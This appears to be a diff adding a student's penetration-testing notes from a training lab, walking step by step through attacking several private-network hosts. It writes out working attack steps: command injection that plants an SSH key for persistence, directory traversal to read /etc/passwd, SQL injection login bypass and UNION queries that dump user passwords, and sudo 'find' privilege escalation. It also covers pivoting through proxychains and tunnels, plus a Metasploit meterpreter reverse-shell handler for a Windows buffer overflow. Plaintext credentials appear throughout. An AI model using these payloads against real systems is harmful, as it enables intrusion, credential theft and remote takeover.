@@ -1,0 +1,424 @@
+## IMPORTANT  #####
+
+10.50.33.174 
+system_user=user2
+user_password=EaglesIsARE78
+
+
+
+
+##### NMAP SCAN RESULTS ##### 
+
+nmap -Pn -T4 10.50.33.174 
+
+
+ nc 10.50.33.174 80
+nc 10.50.33.174 22
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+nmap -Pn -T4 10.50.33.174 -p 80 --script http-enum.nse
+
+
+Nmap scan report for 10.50.33.174
+Host is up (0.0086s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+
+
+
+nikto -h 10.50.33.174
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.50.33.174
++ Target Hostname:    10.50.33.174
++ Target Port:        80
++ Start Time:         2022-10-14 17:39:58 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x435 0x5e9858feab880 
++ The anti-clickjacking X-Frame-Options header is not present.
++ OSVDB-3268: /scripts/: Directory indexing found.
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /scripts/: This might be interesting... possibly a system shell found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.html: Admin login page/section found.
++ /login.php: Admin login page/section found.
++ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2022-10-14 17:40:16 (GMT0) (18 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+ (
+10.50.33.174 
+found input field 
+http://10.50.33.174/getcareers.php?myfile=Executive_Assistant.html ( ATTEMPT COMMAND INJECTION AND DIRECOTRY TRAVERSAL)
+
+ COMMAND INJECTION 
+  ; whoami 
+  ; pwd
+  ( if it works good ) if it moveo n to the next one ( COMMAND INJECTION WAS UNSUCCESFUL )
+  
+   DIRECTORY  TRAVERSAL  ( SUCCESFUL)
+  ../../../../../../../../../../etc/passwd   ( you can find users and their shell) 
+ 
+user2:x:1001:1001::/home/user2:/bin/sh
+
+  ../../../../../../etc/hosts   ( good place to find next pivots ) ( nto the only place ) 
+192.168.28.181 WebApp
+
+---------------------------------------------------------------------------------------------------------
+
+ ( IF YOU CAN GET A WEBSHELL BY UPLOADING THE  WEBSHELL.PHP ) 
+ YOU CAN DO SSH KEY GEN
+ 
+ ( if you can do command  injection you can  also do SSH KEY GEN for initial access) 
+  you do your key gen from your linops so you generate it there 
+
+
+Command injection.
+ when running command inject use ;infront of the command.
+
+
+
+-----------------------------------------------
+ON YOUR BOX
+generate ssh key 
+ssh-keygen -t rsa -b 4096
+where,passphrase (  dont specify  jsut set to default)
+
+ cd .ssh/
+ls 
+cat id_rsa.pub      ( this will give you the  public key)
+
+------
+on the server (THE WEB SERVER WITH PING THINGY.....  the ping partmight be irrelevent )
+
+;mkdir .ssh
+;ls -la /var/www
+;echo "paste the public key" > /var/www/.ssh/authorized_keys
+;cat /var/www/.ssh/authorized_keys
+
+
+ ON YOUR BOX 
+ ssh -i .ssh/id_rsa www-data@10.50.37.95
+
+
+------------------------------------------
+SQL INJECTION
+
+
+user' or '1=1 ( POST IF YOU FILL IN ) 
+user'or 1='1
+
+( GO TO F12
+click on network tab 
+click on the post method 
+click on the request and 
+click raw ) 
+
+
+http://10.50.33.174/login.php?username=user&passwd=user%27+or+%271%3D1
+username=user&passwd=user%27+or+%271%3D1 
+
+
+
+Array
+(
+    [0] => user2
+    [name] => user2
+    [1] => RntyrfVfNER78
+    [pass] => RntyrfVfNER78				EaglesIsARE78
+)
+1Array
+(
+    [0] => user3
+    [name] => user3
+    [1] => Obo4GURRnccyrf
+    [pass] => Obo4GURRnccyrf					Bob4THEEapples
+)
+1Array
+(
+    [0] => Lee_Roth
+    [name] => Lee_Roth
+    [1] => anotherpassword4THEages
+    [pass] => anotherpassword4THEages				nabgurecnffjbeq4GURntrf
+)
+
+
+
+
+ if the pass dont work it might be encoded 
+ try base64  
+ then try rot13
+ 
+(GET IF YOU  choosing from options)
+
+(http://10.50.33.174/scripts/ )
+###### FOUND  A PYTHON SCRIPT CALLED DEVELOPMENT.py ######
+
+#!/usr/bin/python3
+import os
+system_user=user2
+user_password=EaglesIsARE78
+##Developer note
+#script will eventually take above system user credentials and run automated services
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ ssh into the box 
+ 
+ 
+ ( Initial access)
+ 
+ ssh user2@10.50.33.174 
+EaglesIsARE78
+ whoami
+ hostname
+(  if you have a sh shell  do bash to get a bash shell)
+
+ sudo -l 
+ 
+ 
+ find / -type f -perm /2000  -ls 2>/dev/null
+ find / -type f -perm /4000  -ls 2>/dev/null
+ find / -type f -perm /6000  -ls 2>/dev/null
+  check if there's any in /tmp or anything that has a weird/funny af name 
+   if not succesful or not found  try to gtfo bins all the differnet options  at the end of the perms 
+   ( /bin/umount)
+   
+  GTFO BINS  the different options you get ) 
+  https://gtfobins.github.io/
+  
+#####  (NO METHOD OF ESCALATION)  ######
+  
+
+( TRY TO FIND OTHER HOSTS ) 
+ cat /etc/hosts
+ 
+PING SWEEP
+
+ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=3.66 ms
+64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.63 ms ( already have ) 
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=1.14 ms
+
+ arp -a  ( find for subnets)
+
+
+ proxychains nmap -Pn -T4 192.168.28.181,172,190 -p- 2>/dev/null
+
+
+Nmap scan report for 192.168.28.181
+Host is up (0.0029s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+Nmap scan report for 192.168.28.172
+Host is up (0.0029s latency).
+Not shown: 9998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+7008/tcp open  afs3-update
+
+
+
+ ------------------------------------------------------------------------------------------
+ 
+ ( SQL INJECTION STEP THROUGH GUIDE )  
+ 1.see how it works 
+ 2.find a vulnerable one 
+ 3.test the vulnurable one 
+ 4.try to do union to find the number of columns that exist
+ 5. Test golden statement  from information schema
+  
+  
+ ### GET ACCESS TO THE > .181  ####
+ 
+ 1.( CHOOSE ONE OF THE OPTIONS)
+ 
+  ( IF THE SELECTION IS  A NUMBER THEN DO IT WITHOUT QUOTES IN 1=1 if it is then do it with QUOTES
+  
+  2.
+  'or 1='1
+ product=7 OR 1=1
+product=7'OR 1='1 
+
+ 3.
+ http://0.0.0.0:2222/pick.php?product=7 OR 1=1 ( VULNERABLE TO SQL)
+ Find the vulnerable  ones  ( if multiple do it both , annotate both ,  pick one and stick to it if it doesnt work then move onto the next one ) 
+
+ 4CHECK FOR NUMBER OF COLOUMS
+ 
+ http://0.0.0.0:2222/pick.php?product=7 UNION select 1,2,3 #  ( TEST FOR MULTIPLE  IF IT DOESNT WORK IN ONE ( if it's 3 columns TRY MORE) 
+ 
+ 5. Test goldne statement 
+ Selection=2 UNION select table_schema,table_name,Column_name from information_schema.columns
+Selection=2 UNION select table_schema,Column_name,table_name from information_schema.columns 
+
+ ( if more than 3 use placeholders 
+ Selection=2 UNION select table_schema,table_name,Column_name from information_schema.columns
+Selection=2 UNION select table_schema,Column_name,table_name from information_schema.columns (since its 1,3 2 ) 
+ Selection=2 UNION select table_schema,table_name,Column_name from information_schema.columns,4,5,6#
+ 
+ 
+ http://0.0.0.0:2222/pick.php?product=7%20UNION%20select%20table_schema,Column_name,table_name%20from%20information_schema.columns
+ 
+ http://0.0.0.0:2222/pick.php?product=7%20UNION%20select%20%20user_id,name,username%20from%20siteusers.users
+ 
+
+
+Item 	On Hand 	Price
+HAM 	32 	$15
+1 	Aaron 	$Aaron
+2 	user2 	$user2
+3 	user3 	$user3
+4 	Lroth 	$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 	$Aaron
+2 	RntyrfVfNER78 	$user2
+3 	Obo4GURRnccyrf 	$user3
+4 	anotherpassword4THEages 	$Lroth
+
+apasswordyPa$$word
+EaglesIsARE78
+Bob4THEEapples
+
+
+( ATTEMPT TO LOG IN ) 
+  if succesful then continue  with enumurating that device ) 
+   else  MOVE ON 
+
+
+ proxychains nmap -Pn -T4 192.168.28.172 -p- --script=http-enum.nse 2>/dev/null
+   
+  Nmap scan report for 192.168.28.172
+Host is up (0.0029s latency).
+Not shown: 9998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+7008/tcp open  afs3-update   ( abnormal port) 
+
+
+
+######## 192.172.28.172 ##############################
+
+ssh Aaron@192.168.28.172 ( from the current device i ssh is availabe ) otherwise set up a tunnel to it ) 
+ whoami 
+ hostname 
+ cat /etc/hosts
+ sudo -l
+ 
+  env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    
+ **************************************    User Aaron may run the following commands on RoundSensor: **************************************
+ 
+    (ALL) NOPASSWD: /usr/bin/find
+GTFO BINS FOR FIND WITH SUDO **********************************
+
+sudo find . -exec /bin/bash \; -quit
+
+pwnt
+-----------------------------------------------------------------------------------
+ 
+  IF NO  SUDO PERMS DO THIS 
+  
+  
+ find / -type f -perm /2000  -ls 2>/dev/null
+ find / -type f -perm /4000  -ls 2>/dev/null
+ find / -type f -perm /6000  -ls 2>/dev/null
+  check if there's any in /tmp or anything that has a weird/funny af name 
+   if not succesful or not found  try to gtfo bins all the differnet options  at the end of the perms 
+   ( /bin/umount)
+   
+ 
+
+( how to find out if theres a buffer  overflow method ) 
+ if there's gdb in the  box then you have to buffer overflow 
+ when you find a buffer overflow question keey it super simple (  easy method of getting root) 
+ 
+ ----------------------------------------------------------------------------------------------------------------------------------------
+ check for more hosts 
+ for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.035 ms
+64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.16 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=1.76 ms
+
+
+ ( ssh through 192.168.28.172)
+ proxychains nmap -Pn -T4 192.168.28.179 -p 1-10000  --script=http-enum.nse 2>/dev/null
+
+3389  ( RDP) 
+9999 (  EXPLOIT ) 
+
+ set up a master socket on Aaron that will forward you to the  windows box then run rdp command 
+ 
+ ssh -O forward -L5555:192.168.28.179:3389 -S ~/.ssh/CM/Windows placer
+ 
+    xfreerdp /u:comrade /v:0.0.0.0:3333 /dynamic-resolution +glyph-cache +clipboard
+    
+
+ ( TO EXPLOIT THE exploit vuln server  look at EXP DEV  and check for win exploit or lin exp based on the necessary ones) 
+ 
+ 
+ ( if you cant do buffer overflow , steps to  escalate) 
+ 
+ WIN ESCELATE 
+ Check services 
+ 1. custom ones or with no description) 
+ 2. get the path to the execuatable 
+ 3. either dll hijack or replace the execatable with your owns 
+ 4. attempt to rename to see if you can edit  ( do .bak) if you get  a admin prompt then  you're fucked 
+
+  you need to do windows buffer overflow 
+
+ go to your script on your machine 
+ 
+ createa  new tunnel to their ip on ip:9999
+  then open msfconsole
+  
+   use multi/handler
+     set payload windows/meterpreter/reverse_tcp
+      show options 
+      set lhost 0.0.0.0
+      set lport 5555
+       exploit
+       
+
+
+ ( chance the location on your script  to the correct destination)  set new target 
+192.168.28.179
+ port to 9999 
+ 
+
+ WELCOME to secure server ( MEANS LANDED) if your listener didnt pop then you fucked up 
+    
+   if your listener did pop then good job 
+   
+  
+ 
+ 
+ 
+   
+   
+   
